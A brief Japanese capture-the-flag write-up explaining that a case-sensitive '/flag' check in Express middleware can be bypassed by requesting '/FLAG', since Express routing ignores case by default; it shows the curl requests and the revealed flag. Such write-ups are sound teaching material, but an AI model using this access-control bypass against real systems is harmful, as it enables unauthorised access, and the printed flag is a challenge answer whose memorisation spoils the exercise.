# writeup

問題の実装は下記の通り(抜粋)。

```js
const block = (req, res, next) => {
    if (req.path.includes('/flag')) {
        return res.send(403, 'Forbidden :(');
    }

    next();
}

app.get("/flag", block, (req, res, next) => {
    return res.send(FLAG);
})
```

一見すると `/flag` へのアクセスは禁止されているように見えるが、Express のルーティングはデフォルトでは case insensitive なので、`/Flag` や `/FLAG` にアクセスすると `block` 関数によるチェックを回避して FLAG を取得することが可能になる。

```sh
$ curl localhost/flag
:(

$ curl localhost/FLAG
ctf4b{403_forbidden_403_forbidden_403}
```
